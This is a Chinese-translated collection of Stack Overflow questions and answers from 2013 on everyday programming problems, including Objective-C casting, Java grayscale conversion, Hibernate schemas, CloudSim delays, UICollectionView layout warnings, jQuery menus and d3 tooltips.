它可能是许多不同的类类型，所以我想在运行时进行动态分配。

有谁知道为什么这段代码会出现编译器错误？

```
// Where obj is an object of type MyClass
Class myClass = NSClassFromString(@"MyClass");
myClass *objectOfTypeMyClass = obj; 
```

更新：

这是我最终实现它的方式：

```
Class interestClass = NSClassFromString(classProvidedAsString);
id interest = [interestClass createNewInterestUsingManagedObjectContext:backgroundContext];
[interest setValue:title forKey:@"title"];
[interest addLikedByObject:aFriend]; 
```

其中 title 是我可以接受的所有对象的属性，而 createNewInterest 是所有对象都具有的方法。

问题是试图将 id 转换为 interestClass 以使用该类的属性和方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:04:40.170

你为什么不使用`id`？

```
id objectOfTypeMyClass = obj; 
```

另一种选择是使用多态性（如果类是由您创建的）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T10:52:46.407

你可以这样做：

```
NSObject *object=[NSObject new];//this can hold any kind of object

object=@"my name is lakhan";//as string
NSLog(@"%@",object);

object=@[@(10),@(50)]; //now working as array
NSLog(@"%@",object);

object=@{@"k1": @"10", @"k2":@"20"}; // as dictionary
NSLog(@"%@",object); 
```

因此，根据您的要求，您可以使用您需要在对象上设置的任何值。

# java - Java字节图像处理

> ID：16013195
> 
> 赞同：1
> 
> 时间：2013-04-15T10:42:49.483
> 
> 标签：java, image

我需要为 Java 中的图像处理创建一个简单的演示。我的代码是基于摇摆的。我不必做任何复杂的事情，只需表明图像以某种方式发生了变化。我将图像读取为`byte[]`. 无论如何，我可以在不破坏字节的情况下操作这个字节数组来显示一些非常简单的操作。我不想使用`paint()`等。我可以直接对`byte[]`数组做些什么来显示一些变化吗？

编辑：
我正在使用 apache io 库将 jpg 图像作为 byteArrayInputStream 读取。字节读取正常，我可以通过将它们写回 jpeg 来确认它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T12:55:39.557

您可以尝试将 RGB 图像转换为灰度。如果图像以每像素 3 个字节表示为 RedGreenBlue，则可以使用以下公式：y=0.299*r+0.587*g+0.114*b。

要清楚地遍历字节数组并替换颜色。这里有一个例子：

```
 byte[] newImage = new byte[rgbImage.length];

    for (int i = 0; i < rgbImage.length; i += 3) {
        newImage[i] = (byte) (rgbImage[i] * 0.299 + rgbImage[i + 1] * 0.587
                + rgbImage[i + 2] * 0.114);
        newImage[i+1] = newImage[i];
        newImage[i+2] = newImage[i];
    } 
```

**更新：**

上面的代码假设您使用的是原始 RGB 图像，如果您需要处理 Jpeg 文件，您可以这样做：

```
 try {
            BufferedImage inputImage = ImageIO.read(new File("input.jpg"));

            BufferedImage outputImage = new BufferedImage(
                    inputImage.getWidth(), inputImage.getHeight(),
                    BufferedImage.TYPE_INT_RGB);
            for (int x = 0; x < inputImage.getWidth(); x++) {
                for (int y = 0; y < inputImage.getHeight(); y++) {
                    int rgb = inputImage.getRGB(x, y);
                    int blue = 0x0000ff & rgb;
                    int green = 0x0000ff & (rgb >> 8);
                    int red = 0x0000ff & (rgb >> 16);
                    int lum = (int) (red * 0.299 + green * 0.587 + blue * 0.114);
                    outputImage
                            .setRGB(x, y, lum | (lum << 8) | (lum << 16));
                }
            }
            ImageIO.write(outputImage, "jpg", new File("output.jpg"));
        } catch (IOException e) {
            e.printStackTrace();
        } 
```

# google-app-engine - 失败后使用 appcfg 的 GAE 错误

> ID：16013196
> 
> 赞同：0
> 
> 时间：2013-04-15T10:43:10.937
> 
> 标签：google-app-engine

```
D:\kubox\python\GAE>appcfg.py rollback D:\kubox\python\GAE\myapp1
Traceback (most recent call last):
  File "D:\kubox\python\GAE\appcfg.py", line 77, in <module>
    DIR_PATH = get_dir_path(os.path.join('lib', 'ipaddr'))
  File "D:\kubox\python\GAE\appcfg.py", line 67, in get_dir_path
    'file and %s.' % sibling)
ValueError: Could not determine directory that contains both, this file and lib\
ipaddr. 
```

部署失败后，我无法执行 appcfg.py，是不是语法错误？我哪里做错了？WIN 7，cmd提示符

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T20:59:47.290

通常回滚就足够了，但是在部署失败后，有时默认情况下上传不起作用。

作为一种解决方法，您可以更改应用程序版本（app.yaml），然后尝试部署，它应该没问题。

接下来，您可以登录到您的应用程序仪表板并在版本选项卡中，您可以将最新版本切换为默认版本。您的新版本现在应该已启动并运行。作为最后一步，您可以停止旧版本应用程序的任何实例。

希望这可以帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T14:38:07.433

尝试从安装 GAE SDK 的位置运行 appcfg.py。

# java - 在 DB2 上使用其他模式休眠多对一

> ID：16013198
> 
> 赞同：0
> 
> 时间：2013-04-15T10:43:12.640
> 
> 标签：java, hibernate, hibernate-annotations

我正在使用 hibernate-annotation (entitymanager) 来使用单独的模式来处理我的 db2 数据库。

我的主要模式称为“mainschema”。它有一个文件上传表。

然后我有一些其他模式（schema1、schema2、schema3、schemaN）。

如何告诉 schemaN 上的多对一关系以引用“mainschema”上的文件表。如果我打开连接，我会告诉使用哪个模式。但是多对一仍在使用该模式，并且文件上传表仅在“主模式”中可用

感谢帮助！

编辑：

我的文件上传休眠 bean 使用显式的主模式：

```
@Entity
@Table(name="DOKUMENT", schema="mainschema") 
```

然后我为每个客户端都有一个模式，请看这里： 模式未在 bean 中设置。它是在打开连接的时间设置的。

```
@Entity
@Table(name="SOMETABLE") 
```

此表“SOMETABLE”存在于每个客户端的每个模式中。它是指具有多对一的文档实体

```
@Many-To-One
@JoinColumn(name="DOKUMENT_ID")
public Dokument getDokument() { return dokument }
public void setDokument() { this.dokument = dokument } 
```

问题可以关闭。它无需任何更改即可工作，因为hibernate仍在自动使用“mainschema”。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T10:55:22.933

这是如何将 SchemaN 映射到 MainSchema 一对多

```
@Entity
public class SchemaN{

    @OneToMany(targetEntity=MainSchema.class, mappedBy="pk_SchemaN")
    private List<MainSchema> ms;

...

}

@Entity
public class MainSchema{

     @ManyToOne
     @JoinColumn(name="FK_MainSchema")
     private SchemaN pk_schemaN;

...

} 
```

希望这对您有所帮助，对于任何 Schema1 到 N 都应该是相同的

# java - 延迟提交 cloudlet 任务

> ID：16013200
> 
> 赞同：2
> 
> 时间：2013-04-15T10:43:16.910
> 
> 标签：java, cloudsim

我正在研究 Cloudsim。如何将 cloudlet 提交延迟 30 秒？30 秒后第一个 cloudlet 提交后，第二个 cloudlet 必须开始执行。

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-04-01T03:38:05.443

要在 CloudSim 中的小云之间添加一些延迟，您需要访问“DatacenterBroker”类中的“submitCloudLets”方法。在方法“submitCloudlets”中，您需要访问和编辑方法“sendNow”。应插入以下示例代码：

```
protected void sendNow(int entityId, int cloudSimTag, Object data) {
    if(cloudSimTag==CloudSimTags.CLOUDLET_SUBMIT){               
          send(entityId, delay /* enter your delay value here or call a method that calculates the delay value randomly */, cloudSimTag, data);
    }
    else send(entityId, 0, cloudSimTag, data); // CASE the cloudsim tag was not "CLOUDLET_SUBMIT". !!! If you remove this line, your program does not work!!!!
 } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T10:56:55.640

我不确定 Cloudsim 的 api，如果您只需要使用代码添加时间延迟，您也可以使用 java..

利用

```
Thread.sleep(3000); 
```

[您可以在文档http://docs.oracle.com/javase/6/docs/api/java/lang/Thread.html#sleep(long](http://docs.oracle.com/javase/6/docs/api/java/lang/Thread.html#sleep(long) , int)中阅读有关它的更多信息

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2015-02-25T09:17:45.340

在 submitCloudlets 方法中的数据中心代理类中，注释 SendNow 函数并使用 send 函数。

这个函数有一个延迟参数。将延迟更改为您想要的时间。然后，如果您使用 cloudlet 的 getSubmissionTime ，您将获得此参数。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2018-10-17T18:51:29.513

CloudSim Plus 本身就支持这样的功能。您只需要进行这个单一的方法调用`broker.submitCloudletList(cloudletList, submissionDelay)`，Cloudlets 将仅在给定的延迟（以秒为单位）之后提交。

这样，**您无需更改框架代码**即可实现这样的基本功能。如果您更改框架的类以包含仅用于模拟的基本功能，您可能很难将框架的分支更新为最新版本。

检查[https://cloudsimplus.org#main-exclusive-features](https://cloudsimplus.org#main-exclusive-features)上的功能 #8 以了解更多详细信息。

# java - 创建 Map 并将其传递给请求范围的属性

> ID：16013204
> 
> 赞同：0
> 
> 时间：2013-04-15T10:43:38.080
> 
> 标签：java, jsp, spring-mvc, jstl, jsp-tags

在我的 JSP 模型中，我`MyBean`在范围内有一个类 bean。

```
class MyBean {
  ...
  public String getName() { ... }
  public String format(Map<String,String> model) { 
      /* format a template with model */ 
  }
} 
```

我这样使用它：

`<b>${requestScope.myBean.name}</b> - ${requestScope.myBean.format(myMap)}`

`myMap`将包含一些仅在 JSP 页面中已知的信息，例如 URL。是否有我可以用来声明和传递地图的标签/库，例如

```
<lib:map var="myMap">
 <lib:mapEntry name="base_url" value="${some_url_value_in_scope}"/>
</lib:map>
<b>${requestScope.myBean.name}</b> - ${requestScope.myBean.format(myMap)} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T10:51:03.233

如果您正在运行**EL 2.2**，它是**Servlet 3.0**的一部分。然后`${requestScope.myBean.format(myMap)`会工作。或者创建一个**自定义 EL 函数**并像这样调用它`${someTag:format(requestScope.myBean, myMap)}`

可能有更好的方法，但你可以这样做：

`<jsp:useBean id="myMap" class="java.util.HashMap" scope="request"/>
<c:set target="${myMap}" property="base_url" value="${some_url_value_in_scope}"/>`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T10:51:33.110

为什么像 URL 这样的信息只能在 jsp-page 本身中使用？数据是在 jsp-page 中生成/创建的吗？

在spring处理的“MyBaan”类中？如果是，您可以使用 spring-controls 将数据放入类中......

# jquery - Jquery 加载头信息

> ID：16013206
> 
> 赞同：0
> 
> 时间：2013-04-15T10:43:38.727
> 
> 标签：jquery

在页面完成加载之前，我需要从 JQuery 加载调用中获取标题信息。

背景信息，我正在使用 load() 将内容加载到页面的一部分中，但是当连接速度很慢时，似乎系统没有“冻结”。

解决方案：在加载之前从正在加载的文件中获取文件大小，并在屏幕上显示一个状态栏，显示它的加载速度。

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:01:37.080

非常简单的示例，基于[通过 Javascript/jQuery 的 Ajax HEAD 请求的回答](https://stackoverflow.com/questions/4715223/ajax-head-request-via-javascript-jquery)

```
$.ajax({
    type: "HEAD",
    async: true,
    url: '/',
    success: function(message,text,response){
        console.log(response.getResponseHeader('Content-Length')]);
    }
}); 
```

# ios - 在 iOS 中存储无价值数据

> ID：16013207
> 
> 赞同：0
> 
> 时间：2013-04-15T10:43:47.753
> 
> 标签：ios, objective-c, core-data

我使用 Core Data 在我的应用程序中存储对象。基本上我存储对用户有价值的对象，例如用户喜欢的东西或他想去的地方。这些对象中的每一个都与用户本人之间存在隐藏的关系。一切都是合乎逻辑的。但是现在我想存储（缓存）一些不直接链接到用户的数据，例如搜索请求的结果。这些对象大多只在一个特定的地方使用，并且可能有一些过期时间，比如缓存或类似的东西。所以我需要存储这些对象，但将来可以将它们从存储中删除。问题是这些物品与我的贵重物品属于同一实体。另一件事是这些非有价值的对象和一些有价值的对象之间可能存在关系。

存储这些无价值对象的最佳方法是什么，最重要的是，从它们中清除 Core Data Storage？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:39:05.057

这取决于您需要这些物品的用途。
基本上，这些是具有到期日期的项目（临时对象），您可以在每个对象上使用时间戳，或者您可以创建一个与您可以查询和删除的项目相关的新实体（一对一关系）在您指定的条件下。
当您打开商店协调器时，您可能有一个清理规则（您需要实施），它将在后台运行并删除不再相关的项目（确保不向用户显示它们，或者在何时访问它们您执行清理）。
尝试将您的清理工作保持在后台，并在不会打扰用户的时候执行。
在我自己看来，最好将项目标记为隐藏，然后立即删除它们，因为删除是一项可能会阻塞 UI 的繁重操作。也尽量减少你的删除（不是一次所有的对象，而是小批量的对象）

# ios - UICollectionView 布局问题

> ID：16013209
> 
> 赞同：63
> 
> 时间：2013-04-15T10:43:52.547
> 
> 标签：ios, uicollectionview, uicollectionviewlayout

我正在使用`UICollectionView`流布局。我也做了一个习惯`UICollectionViewCell`。但是在运行项目时，控制台不断抛出这个错误——

```
The behavior of the UICollectionViewFlowLayout is not defined because:
 the item height must be less that the height of the UICollectionView minus the section insets top and bottom values. 
```

我已确保单元格的大小是正确的

有没有人能够解决这个问题。

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2014-01-11T02:27:24.883

我发现，使用`storyboards`，您必须进入`storyboard`并单击整体`View Controller`（视图应以蓝色突出显示）并转到`Attributes Inspector`（屏幕右侧的第四个选项卡）并取消选中“顶部栏下” 、“在底部条下”和“在不透明条下”。这为我解决了问题，也为我的同事解决了问题。

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2014-03-05T11:48:47.480

在使用集合视图呈现全屏视图控制器时，我遇到了一些问题。

基本上在运行时，它会询问项目的大小并简单地返回集合视图的大小：

```
-(CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath {
    return self.collectionView.frame.size;
} 
```

* * *

## 回答 #3

> 赞同：28
> 
> 时间：2014-10-07T13:02:13.290

我知道这是一个很晚的回复，但我也经历过。

在我的视图控制器中，我们称它为*MyViewController*我有一个`UICollectionView`使用自定义`UICollectionViewCell`的。我正在实现方法[collectionView:layout:sizeForItemAtIndexPath](https://developer.apple.com/library/iOs/documentation/UIKit/Reference/UICollectionViewDelegateFlowLayout_protocol/index.html#//apple_ref/occ/intfm/UICollectionViewDelegateFlowLayout/collectionView:layout:sizeForItemAtIndexPath:)，我在其中返回一个项目大小，该大小取决于`UICollectionView`.

*MyViewController*是在故事板中使用自动布局来控制`UIViewController`.

在纵向模式下，单元格看起来很好，但在横向模式下却没有。

`UICollectionViewLayout`我通过使我的`UICollectionView`内部`viewWillLayoutSubviews`方法无效来解决我的问题。

```
- (void)viewWillLayoutSubviews {
    [self.myCollectionView.collectionViewLayout invalidateLayout];
} 
```

早些时候我曾试图使里面的布局无效`willAnimateRotationToInterfaceOrientation:duration`，但没有奏效。原因可能是所有视图的尺寸还没有计算出来，所以我们必须等到自动布局完成它的魔力。我指的是[这个 SO 线程](https://stackoverflow.com/questions/23555275/is-there-an-ios-method-that-fires-when-autolayout-has-completed)。

**Swift 4.0 更新：**

```
 override func viewDidLayoutSubviews() {
    super.viewDidLayoutSubviews()
    self.myCollectionView.collectionViewLayout.invalidateLayout()
  } 
```

* * *

## 回答 #4

> 赞同：18
> 
> 时间：2013-04-16T19:27:06.147

在尝试使用全屏单元格创建集合视图时，我自己曾多次遇到此问题。我的问题是由于在 IB/Storyboard 中布局 4" 屏幕并为项目大小指定 320*568，但在模拟器中使用高度为 480 的 3.5" 屏幕运行。解决方案是在代码如下：

```
UICollectionViewFlowLayout *layout = (id) self.collectionView.collectionViewLayout;
layout.itemSize = self.collectionView.frame.size; 
```

这可确保在运行时正确设置单元格大小。

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2014-06-04T13:45:59.163

如果您使用故事板和自动布局，调试这类问题真的很难......

尝试在 iPhone 上全屏显示 UICollectionViewCell 时遇到了类似的问题。

大多数情况下，问题在于设置的单元格的大小

```
-(CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *) 
```

或直接在 flowLayout.itemSize 上。

但是...尝试：

1.  选择视图控制器：

![选择视图控制器](https://i.stack.imgur.com/vskcC.png)

2.  然后取消选中延伸边选项：

![禁用延伸边选项](https://i.stack.imgur.com/FYsKf.png)

现在尝试设置您的自动布局约束。

祝你好运。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2016-03-02T16:11:19.917

这解决了我的问题：

```
-(CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout*)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath 
{ 
return CGSizeMake(self.collectionView.frame.size.width, self.collectionView.frame.size.height - 70);
} 
```

您可以在此屏幕上从顶部和底部看到填充值：

[![在此处输入图像描述](https://i.stack.imgur.com/z4VOY.png)](https://i.stack.imgur.com/z4VOY.png)

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2013-07-22T16:51:42.337

请务必为 UICollectionView 和 UICollectionviewcell 设置正确的自动调整大小掩码。这解决了我对 iPhone 4 Simulator 的问题

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2015-12-22T00:18:48.380

对我来说，我在自定义 UIView 中使用 AKPickerView，这给了我一系列警告，就像这里提到的一样。我为消除警告所做的只是取消选中我的自定义 UIView 的属性检查器中名为“AutoResize Subviews”的框。这使警告变得如此难以消除，我以为我的记录器停止了工作。

[![在此处输入图像描述](https://i.stack.imgur.com/ASgIz.png)](https://i.stack.imgur.com/ASgIz.png)

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2018-05-19T21:50:55.147

造成这种情况的原因是我试图将单元格设置为超级视图的大小，而不是`UICollectionView`. 简单地用框架替换了superview`UICollectionView`框架。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2015-03-13T19:01:20.557

我刚刚遇到了同样的错误消息，但对我来说，问题是当我从 api 收到新数据并尝试刷新我的 collectionView 时，调用的方法`[collectionView reloadData]`没有在主线程上调用它。

希望这可以帮助某人...

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2015-06-12T13:09:18.683

我有同样的问题

> 未定义 UICollectionViewFlowLayout 的行为，因为：项目高度必须小于 UICollectionView 的高度减去部分插入顶部和底部值。

我通过检查 Insets 部分中的值解决了这个问题。对于修复单元格大小，我使用了下面的代码。

```
- (CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath{
CGSize result = [[UIScreen mainScreen] bounds].size;
CGFloat scale = [UIScreen mainScreen].scale;
result = CGSizeMake(result.width * scale, result.height * scale);
CGFloat cellWidth =  [[UIScreen mainScreen] bounds].size.width - 20;
CGFloat cellHeight = [[UIScreen mainScreen] bounds].size.height - 120;

return CGSizeMake(cellWidth, cellHeight);

} 
```

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2021-10-29T10:13:58.943

当我在 collectionView 中需要全屏单元格时，我遇到了这个问题。所以我用这个决定解决了它。

1.  单元格大小等于集合视图大小

[![在此处输入图像描述](https://i.stack.imgur.com/yf06G.png)](https://i.stack.imgur.com/yf06G.png) 2\. 故事板“Inset from:”从 Safe Area 更改为 Content Inset

[![在此处输入图像描述](https://i.stack.imgur.com/cyIGT.png)](https://i.stack.imgur.com/cyIGT.png)

3.  将“内容插入”更改为从不 [![在此处输入图像描述](https://i.stack.imgur.com/orIwM.png)](https://i.stack.imgur.com/orIwM.png)

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2020-04-30T15:53:58.257

对我来说，解决方案是`Estimate Size`（在故事板大小属性窗格中）将集合视图设置为`None`.

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2016-09-21T21:04:32.870

如果您通过容器视图 + UICollectionViewController 加载集合视图，您可能已经在*容器*视图上设置了高度约束，这限制了集合视图本身的高度。就我而言，我发现 collectionView.contentSize 比我在容器视图上设置的约束要高。

显然这是一个边缘案例，但以防万一你有类似的设置，我想我会添加这个评论。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2020-12-02T16:39:19.157

它抱怨项目高度大于collectionView的高度。所以它很突出。所以你必须使高度相同或更少。像这样：

```
 func collectionView(_ collectionView: UICollectionView, layout collectionViewLayout: UICollectionViewLayout, sizeForItemAt indexPath: IndexPath) -> CGSize {
    return CGSize(width: collectionView.frame.height, height: collectionView.frame.height)

} 
```

使用高度作为宽度使其成为正方形。这是假设 inset 是 0，如果你没有做任何事情，它应该是 0。

* * *

## 回答 #16

> 赞同：-3
> 
> 时间：2015-01-08T17:07:41.400

上述修复都没有为我做。我用这个修复了它

```
- (CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout*)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath
{CGFloat currentWidth = collectionView.frame.size.width;
UIEdgeInsets sectionInset = [(UICollectionViewFlowLayout *)collectionView.collectionViewLayout sectionInset]; //here the sectionInsets are always = 0 because of a timing issue so you need to force set width of an item a few pixels less than the width of the collectionView.

CGFloat width = currentWidth - 10;
} 
```

# c# - 监听其他进程窗口

> ID：16013210
> 
> 赞同：0
> 
> 时间：2013-04-15T10:43:57.773
> 
> 标签：c#, winapi

我们有一个第三方 winforms 软件，我们需要批量运行我需要监控是否显示了某个进程的某个表单（我们同时运行多个进程）。

我已使用此方法获取进程的所有窗口句柄

```
public IEnumerable<int> EnumerateProcessWindowHandles(int processId)
{
    var handles = new List<IntPtr>();
    try
    {

        foreach (ProcessThread thread in Process.GetProcessById(processId).Threads)
            Win32.EnumThreadWindows(thread.Id,
                (hWnd, lParam) => { handles.Add(hWnd); return true; }, IntPtr.Zero);

    }
    catch(Exception e) {}
    return handles.Select(h => (int)h);
} 
```

然后这个方法从 hwnd 中获取窗口标题

```
public string GetTitle(int hwnd)
{
    int length = Win32.SendMessage((IntPtr)hwnd, Win32.WM_GETTEXTLENGTH, 0, IntPtr.Zero);
    var sb = new StringBuilder(length + 1);
    Win32.SendMessage((IntPtr)hwnd, Win32.WM_GETTEXT, (IntPtr)sb.Capacity, sb);
    return sb.ToString();
} 
```

每一秒我都用上述方法轮询进程，但有时它无法检测到显示的窗口。有问题的窗口打开超过一秒钟，因此它不是 pol 频率。

当窗口关闭/打开时，是否有更可靠的方法来获取回调？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T10:47:16.447

听窗口创建和销毁最干净的方法可能是使用[CBT 挂钩](http://msdn.microsoft.com/en-gb/library/windows/desktop/ms644990.aspx)。听`HCBT_CREATEWND`和`HCBT_DESTROYWND`。这篇 MSDN 文章[.NET Framework 中的 Windows Hooks](http://msdn.microsoft.com/en-us/magazine/cc188966.aspx)从 .net 的角度介绍了该主题。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-15T11:17:42.360

也许这可以帮助

[1] [http://spradip.wordpress.com/category/programming-c/page/2/](http://spradip.wordpress.com/category/programming-c/page/2/)

这是任何 ms C++ 示例

[2] [http://msdn.microsoft.com/en-us/library/windows/desktop/ms686701(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ms686701(v=vs.85).aspx)

# ios - 从工具栏子类更改工具栏项目不会立即更新工具栏

> ID：16013219
> 
> 赞同：1
> 
> 时间：2013-04-15T10:44:31.853
> 
> 标签：ios, objective-c, uitoolbar

我有一个`UIToolbar`. 我创建它是因为我在多个页面上有相同的工具栏（`UIViewControllers`）。我接受`UIToolbar`了我的`UIViewControllers`（我正在使用故事板）并将这个子类分配给`UIToolbar`该类。

此外，该工具栏上的每个项目都是使用自定义视图 ( `UIButton`) 创建的。当我从其子类中更改其中一项时，它不会立即反映在工具栏上。我必须转到另一个屏幕并返回查看更新的结果。

有什么方法可以立即更新吗？谢谢。

# python - traitsui 中的动态列表

> ID：16013220
> 
> 赞同：0
> 
> 时间：2013-04-15T10:44:33.317
> 
> 标签：python, list, enums, enthought, traitsui

我需要构建一个动态枚举列表，其中列表的每个元素都应包含相同的引用枚举。然后用户可以从枚举中选择值。这是我的代码：

```
class EnumListContainer(HasTraits):
    values = ['a', 'b', 'c']
    enum_list = List(Enum(values))

elc = EnumListContainer()
elc.configure_traits() 
```

它运行良好并显示了我需要的内容，只是我事先不知道值的内容。我应该如何更新那个简单的代码才能在运行时传递一个列表？我已经尝试了一些东西，但我似乎没有得到任何地方。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-03T21:52:21.903

我不太清楚你在问什么，但据我所知，它是这样的：

```
class EnumListContainer(HasTraits):
  values=List(Str)
  enumlist=List(Enum)

  def __init__(self,vals):
    self.values=vals

  def _enumlist_default(self):
    return List(self.values) 
```

# jquery - 菜单多级中的父母jquery

> ID：16013222
> 
> 赞同：0
> 
> 时间：2013-04-15T10:44:33.367
> 
> 标签：jquery

对不起，因为我的英语不好！但我有这样的问题。

1.  这是我的 html 代码（它是一个多级菜单，并且级别菜单是动态的）

    ```
    <!-- menu level 1-->
     <ul class='ul_parent'>
       <li>
          <a href='#' class='fNiv'>home</a>
       </li>
       <li>
          <a href='#' class='fNiv'>News</a>
       </li>
       <li>
          <a href='#' class='fNiv'>Product</a>
          <!-- menu level 2-->
          <ul class='ul_childrent'>
            <li>
                <a href='#'>Type 1</a>
                <!-- menu level 3-->
                <ul class='ul_childrent'>
                     <li>
                         <a href='#'>Type 1.1</a>
                         <!--........-->
                         <!-- menu level n-->
                         <!-- ........-->     
                         <ul class='ul_childrent'>
                             <li><a href='#' class='menu_level_n'>Type 1.1...n</a></li>
                         </ul>
                     </li>
                     <li><a href='#'>Type 1.2</a></li>
                     <li><a href='#'>Type 1.3</a></li> 
                </ul>
           </li>
            <li><a href='#'>Type 2</a></li>
            <li><a href='#'>Type 3</a></li>
          </ul> 
       </li>
     </ul> 
    ```

2.  我想在单击“ `.menu_level_n`”时转到设置菜单级别 1 处于活动状态（菜单类`.fNiv`）。这可能会编码 jquery（它不起作用）。

    ```
    $(document).ready(function(){
                 $('.menu_level_n').click(function(){
                     $(this).parents('.fNiv').addClass('active');
                 });
           }); 
    ```

请帮我！非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T10:49:44.350

带有选择器的元素`'.fNiv'`不是您单击的项目的父级。您需要找到具有此选择器作为直接子元素的元素的父元素：

```
$(this).parents().children('.fNiv').last().addClass('active'); 
```

[JSFiddle](http://jsfiddle.net/aE9BB/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T10:50:49.453

改变：

```
$(this).parents('.fNiv').addClass('active'); 
```

到

```
$(this).parents("li").find('.fNiv').addClass('active'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T10:50:57.593

这是工作的

```
 $(document).ready(function(){
         $('.menu_level_n').click(function(){
             $(this).parents('li').last().find('.fNiv').addClass('active');
         });
   }); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-15T10:54:48.140

你可以使用`eq()`和`siblings()`..

```
 $('.menu_level_n').click(function(){
  $(this).parents().eq(5).siblings('.fNiv').addClass('active');
 }); 
```

`eq(5)`因为您的 li 是第 5 级父母和兄弟姐妹（）

# javascript - 如何在 d3.js 中鼠标悬停时获取相应位置的值？

> ID：16013224
> 
> 赞同：1
> 
> 时间：2013-04-15T10:44:40.663
> 
> 标签：javascript, backbone.js, angularjs, d3.js, javascript-framework

我需要在使用 d3.js 将鼠标悬停在折线图/条形图上时在相应位置显示值

```
var toolTip = svg.selectAll("path")
.append("svg:title")
.text(getmouseoverdata(data)
);

function getmouseoverdata(d) {
    return d;
} 
```

在这里，当鼠标悬停在图表中的任何位置时，我会获取数组中的所有数据。

但我想在相应的位置显示值。我怎样才能实现它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T11:55:12.753

您可以像这样使用 d3js 鼠标事件处理程序

```
var coordinates = [0, 0];
coordinates = d3.mouse(this);

var x = coordinates[0];
var y = coordinates[1]; 
```

它将为您提供当前的鼠标坐标。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T18:35:10.527

如果您只想在将鼠标悬停在路径/矩形元素上时显示数据元素，您可以尝试在创建这些元素时直接将标题添加到这些元素上？

例如：

```
var data = [0, 1, 2, 3, 4, 5],
    size = 300;

var canvas = d3.select("body")
               .append("svg:svg")
                    .attr("width", size)
                    .attr("height", size);

var pixels = size / data.length;

canvas.selectAll("rect").data(data).enter().append("svg:rect")
      .attr("fill", "red")
      .attr("height", function(d){return d * pixels})
      .attr("width", pixels/2)
      .attr("x", function(d,i){return i * pixels})
      .attr("y", 0)
      .append("title")    //Adding the title element to the rectangles.
      .text(function(d){return d}); 
```

如果您将鼠标悬停在矩形上，此代码应创建五个矩形，其数据元素显示在工具提示中。

希望这可以帮助。

* * *

根据评论编辑：

对于自下而上的图表，您可以像这样更改 y 属性：

```
.attr("y", function(d){return size - d * pixels}) 
```

此添加将导致条形图从图表的 maxHeight 和条形图大小之间的差异开始，从而有效地将自上而下的图表转变为自下而上的图表。

# cassandra - Run Single node Cassandra cluster and do queries with QUORUM consistency?

> ID：16013227
> 
> 赞同：1
> 
> 时间：2013-04-15T10:44:49.467
> 
> 标签：cassandra, cql, consistency

I'm trying to setup a simple and "lightweight" development/testing environment for my application where I could run single node Cassandra cluster with key space where `'replication_factor':'1'`.

But when I do CQL query with QUORUM consistecy then I still get an error for not having two nodes in my cluster:

```
com.datastax.driver.core.exceptions.UnavailableException: 
Not enough replica available for query at consistency QUORUM (2 required but only 1 alive) 
```

Any way to allow queries to work with QUORUM consistency level in this one node setup or is only fallback to use ONE (or add second node to cluster)?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-17T13:37:39.217

You must have changed it to a replication_factor of 2 or 3 by mistake; QUORUM of 1 is 1.

# symfony - 如何在 Symfony2 中使用 Twig 计算日期是否超过 2 年

> ID：16013230
> 
> 赞同：0
> 
> 时间：2013-04-15T10:44:57.087
> 
> 标签：symfony, twig

如果日期小于 2 岁，我希望能够显示文本“OK”，如果日期超过 2 岁，我想显示“2 岁以上”。如何使用 Twig 执行此操作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T14:21:18.103

